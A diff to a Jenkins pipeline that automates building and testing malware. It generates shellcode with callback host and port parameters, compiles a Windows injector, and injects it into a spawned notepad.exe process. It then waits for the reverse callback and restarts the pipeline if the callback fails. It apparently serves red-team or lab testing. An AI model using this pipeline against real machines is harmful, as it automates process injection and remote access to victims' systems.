@@ -29,16 +29,20 @@ pipeline {
             agent { label 'linux' }
             steps {
                 dir('src') {
-                    sh 'make LHOST=$LHOST LPORT=$LPORT HOSTNAME=$HOSTNAME all'
+                    sh '''
+                    make LHOST=$LHOST LPORT=$LPORT HOSTNAME=$HOSTNAME all
+                    '''
                 }
             }
         }
 
-        stage('Compile and Stash Malware') {
+        stage('Compile the Malware') {
             agent { label 'linux' }
             steps {
                 dir('src') {
-                    sh 'x86_64-w64-mingw32-g++ -std=c++17 -static -o $EXECUTABLE_NAME $MALWARE_DIR -lpsapi'
+                    sh '''
+                    x86_64-w64-mingw32-g++ -std=c++17 -static -o $EXECUTABLE_NAME $MALWARE_DIR -lpsapi
+                    '''
                     stash includes: "$EXECUTABLE_NAME", name: 'compiled_malware'
                 }
             }
@@ -50,12 +54,13 @@ pipeline {
                 stage('Start Listener') {
                     agent { label 'linux' }
                     steps {
-                        dir('scripts') {
-                            sh '''
-                                uv install
+                        script {
+                            dir('scripts') {
+                                sh '''
                                 (uv run pipeline callback; echo $? > callback_result.txt) &
                                 echo $! > listener.pid
-                            '''
+                                '''
+                            }
                         }
                     }
                 }
@@ -66,36 +71,33 @@ pipeline {
                         dir('malware') {
                             unstash 'compiled_malware'
                             bat '''
-                                powershell -Command "
-                                    $proc = Start-Process -FilePath 'notepad.exe' -PassThru
-                                    Start-Sleep -Seconds 2
-                                    $pid = $proc.Id
-                                    Write-Output 'Target PID: ' + $pid
-                                    Start-Process -FilePath '.\\injector.exe' -ArgumentList $pid
-                                "
+                            powershell -Command "$proc = Start-Process -FilePath 'notepad.exe' -PassThru; Start-Sleep -Seconds 2; $pid = $proc.Id; Write-Output 'Target PID: ' + $pid; Start-Process -FilePath '.\\injector.exe' -ArgumentList $pid"
                             '''
                         }
                     }
                 }
 
-                stage('Evaluate Callback') {
+                stage('Wait for Callback and Evaluate Result') {
                     agent { label 'linux' }
                     steps {
-                        dir('scripts') {
-                            sh '''
+                        script {
+                            dir('scripts') {
+                                // Wait for listener to exit and read its result
+                                sh '''
                                 echo "[*] Waiting for listener to complete..."
                                 while kill -0 $(cat listener.pid) 2>/dev/null; do sleep 1; done
-                            '''
+                                '''
 
-                            script {
                                 def result = sh(script: 'cat callback_result.txt', returnStdout: true).trim()
                                 echo "Callback listener exited with code: ${result}"
 
                                 if (result != '0') {
                                     currentBuild.description = 'Callback failed — restarting from Generate Shellcode'
                                     build job: env.JOB_NAME,
-                                          parameters: [string(name: 'RESTART_STAGE', value: 'generate')],
-                                          wait: false
+                                  parameters: [
+                                      string(name: 'RESTART_STAGE', value: 'generate')
+                                  ],
+                                  wait: false
                                 }
                             }
                         }
@@ -105,4 +107,3 @@ pipeline {
         }
     }
 }
-
